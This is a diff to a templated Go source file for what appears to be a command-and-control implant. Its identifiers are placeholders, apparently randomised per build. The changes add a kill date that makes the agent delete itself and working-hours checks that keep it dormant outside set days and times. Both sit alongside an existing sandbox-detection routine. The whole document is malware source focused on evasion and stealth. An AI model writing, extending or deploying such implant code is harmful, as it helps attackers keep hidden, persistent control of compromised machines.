@@ -40,6 +40,13 @@ type {AGENT_STRUCT_NAME} struct {
 	{AGENT_SECRET_KEY_FIELD}            *fernet.Key
 	{AGENT_CURRENT_INTERACTIVE_TASK_FIELD} string
 	{AGENT_DISABLE_SANDBOX_FIELD}       bool
+	{AGENT_KILL_DATE_FIELD}             string
+	{AGENT_WORKING_HOURS_FIELD}         struct {
+		StartHour int      `json:"start_hour"`
+		EndHour   int      `json:"end_hour"`
+		Timezone  string   `json:"timezone"`
+		Days      []int    `json:"days"`
+	}
 }
 
 type {TASK_STRUCT_NAME} struct {
@@ -103,6 +110,18 @@ func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL string, disableSandbox boo
 		{AGENT_RUNNING_FIELD}:             false,
 		{AGENT_CURRENT_INTERACTIVE_TASK_FIELD}: "",
 		{AGENT_DISABLE_SANDBOX_FIELD}:      disableSandbox,
+		{AGENT_KILL_DATE_FIELD}:            "{KILL_DATE}",
+		{AGENT_WORKING_HOURS_FIELD}:        struct {
+			StartHour int      `json:"start_hour"`
+			EndHour   int      `json:"end_hour"`
+			Timezone  string   `json:"timezone"`
+			Days      []int    `json:"days"`
+		}{
+			StartHour: {WORKING_HOURS_START_HOUR},
+			EndHour:   {WORKING_HOURS_END_HOUR},
+			Timezone:  "{WORKING_HOURS_TIMEZONE}",
+			Days:      []int{{WORKING_HOURS_DAYS}},
+		},
 	}
 
 	return agent, nil
@@ -719,6 +738,13 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 	// fmt.Println("[DEBUG] Agent run function started")
 
 	for {
+		// Check kill date first
+		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
+			// fmt.Println("[DEBUG] Kill date reached, agent self-deleting")
+			a.{AGENT_SELF_DELETE_FUNC}()
+			return
+		}
+
 		// fmt.Println("[DEBUG] Attempting agent registration...")
 		err := a.{AGENT_REGISTER_FUNC}()
 		if err == nil {
@@ -734,6 +760,21 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 
 	// fmt.Println("[DEBUG] Entering main agent loop...")
 	for a.{AGENT_RUNNING_FIELD} {
+		// Check kill date on each iteration
+		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
+			// fmt.Println("[DEBUG] Kill date reached during operation, agent self-deleting")
+			a.{AGENT_SELF_DELETE_FUNC}()
+			return
+		}
+
+		// Check if we're outside working hours
+		if !a.{AGENT_CHECK_WORKING_HOURS_FUNC}() {
+			// Sleep for 5 minutes and check again
+			// fmt.Println("[DEBUG] Outside working hours, sleeping until next check...")
+			time.Sleep(5 * time.Minute)
+			continue
+		}
+
 		checkCount++
 		// fmt.Printf("[DEBUG] Loop iteration count: %d\n", checkCount)
 
@@ -958,6 +999,55 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_SANDBOX_FUNC}() bool {
 	}
 
 	return false
+}
+
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WORKING_HOURS_FUNC}() bool {
+	now := time.Now()
+	if a.{AGENT_WORKING_HOURS_FIELD}.Timezone == "UTC" {
+		// Use UTC time
+		now = now.UTC()
+	} else {
+		// Use local time for other timezones (for simplicity)
+		// In a real implementation, you might want to parse the timezone
+	}
+
+	// Check if current day is in the allowed working days
+	// Go's Weekday: 0=Sunday, 1=Monday, 2=Tuesday, etc.
+	currentWeekday := int(now.Weekday())
+	if currentWeekday == 0 {
+		currentWeekday = 7 // Sunday is day 7 in our config (1-7 for Monday-Sunday)
+	}
+
+	allowed := false
+	for _, day := range a.{AGENT_WORKING_HOURS_FIELD}.Days {
+		if day == currentWeekday {
+			allowed = true
+			break
+		}
+	}
+
+	if !allowed {
+		return false
+	}
+
+	// Check if current hour is within working hours
+	currentHour := now.Hour()
+	if currentHour >= a.{AGENT_WORKING_HOURS_FIELD}.StartHour && currentHour < a.{AGENT_WORKING_HOURS_FIELD}.EndHour {
+		return true
+	}
+
+	return false
+}
+
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_KILL_DATE_FUNC}() bool {
+	killTime, err := time.Parse("2006-01-02T15:04:05Z", a.{AGENT_KILL_DATE_FIELD})
+	if err != nil {
+		// If we can't parse the kill date, assume no kill date (return false to not kill)
+		return false
+	}
+
+	now := time.Now().UTC()
+	return now.After(killTime)
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}() bool {
